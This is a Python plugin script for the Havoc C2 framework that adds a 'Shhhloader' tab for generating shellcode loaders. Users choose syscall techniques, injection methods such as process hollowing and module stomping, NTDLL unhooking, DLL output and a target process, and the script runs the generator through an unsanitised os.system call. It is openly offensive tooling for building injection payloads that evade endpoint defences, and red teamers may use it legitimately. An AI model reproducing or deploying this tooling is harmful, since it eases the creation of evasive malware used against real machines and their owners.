#!/usr/bin/env python
# -*- Coding: UTF-8 -*-
# Author: Jakob Friedl
# Created on: Mon, 16. Oct 2023
# Description: Shhhloader support for Havoc C2 framework
# Usage: Load this script in Havoc under Scripts -> Scripts Manager to create Shhhloader Tab

import os, sys
import havoc
import havocui

shhhloader_path = "/opt/Shhhloader"

# Defaults
process = "explorer.exe"
unhook = False
dll = False 
verbose = False

# Flags
unhook_flag = ""
dll_flag = ""
verbose_flag = ""

if not os.path.exists(shhhloader_path):
    print("[-] Shhhloader not found in: ", shhhloader_path) 
os.chdir(shhhloader_path)

# Create dialog
dialog = havocui.Dialog("Shhhloader Payload Generator")

dialog.addLabel("[*] Shellcode path")
def change_shellcode_path(): 
    global shellcode_path
    shellcode_path = havocui.openfiledialog("Shellcode path").decode("ascii")
    print("[*] Shellcode path changed: ", shellcode_path)
dialog.addButton("Choose shellcode", change_shellcode_path)

dialog.addLabel("[*] Syscall execution method")
syscall_exec_methods = ["SysWhispers2", "SysWhispers3", "GetSyscallStub"]
def change_syscall_exec_method(num):
    global syscall_exec_method
    if num: 
        syscall_exec_method = syscall_exec_methods[num - 1]
        print("[*] Syscall execution method changed: ", syscall_exec_method) 
    else: 
        havocui.messagebox("Error", "Select a valid syscall execution method.")   
dialog.addCombobox(change_syscall_exec_method, "Select syscall execution method", *syscall_exec_methods)

dialog.addLabel("[*] Shellcode execution method")
shellcode_exec_methods = ["TreadlessInject", "ModuleStomping", "QueueUserAPC", "ProcessHollow", "EnumDisplayMonitors", "RemoteThreadCOntext", "RemoteThreadSuspended", "CurrentThread"]
def change_shellcode_exec_method(num):
    global shellcode_exec_method
    if num:
        shellcode_exec_method = shellcode_exec_methods[num - 1]
        print("[*] Shellcode execution method changed: ", shellcode_exec_method)
    else:
        havocui.messagebox("Error", "Select a valid shellcode execution method.") 
dialog.addCombobox(change_shellcode_exec_method, "Select shellcode execution method", *shellcode_exec_methods)

dialog.addLabel("------------------------------------------------------")
def change_unhook():
    global unhook
    global unhook_flag
    unhook = not unhook  
    if unhook:
        unhook_flag = "-u"
    else: 
        unhook_flag = ""
    print("[*] Unhook changed: ", unhook)
dialog.addCheckbox("Unhook NTDLL (Default: False)", change_unhook)

def change_dll():
    global dll
    global dll_flag
    dll = not dll
    if dll:
        dll_flag = "--dll"
    else: 
        dll_flag = ""
    print("[*] DLL settings changed: ", dll)
dialog.addCheckbox("Create as DLL (Default: False)", change_dll)

def change_verbose():
    global verbose
    global verbose_flag
    verbose = not verbose
    if verbose: 
        verbose_flag = "-v"
    else: 
        verbose_flag = ""
    print("[*] Verbose changed: ", verbose)
dialog.addCheckbox("Verbose (Default: False)", change_verbose)

dialog.addLabel("Process to inject into (Default: explorer.exe)")
def change_process(p): 
    global process 
    process = p
    print("[*] Process changed: ", process)
dialog.addLineedit("...", change_process)

def run():
    outfile = havocui.savefiledialog("Save").decode("ascii")
    os.system(f"python3 {shhhloader_path}/Shhhloader.py {shellcode_path} -sc {syscall_exec_method} -m {shellcode_exec_method} -p {process} {unhook_flag} {dll_flag} {verbose_flag} -o {outfile}")
    dialog.close()
dialog.addButton("Generate", run)

# Create Tab 
def shhhloader_generator():
    dialog.exec() 

havocui.createtab("Shhhavoc", "Shhhloader", shhhloader_generator)
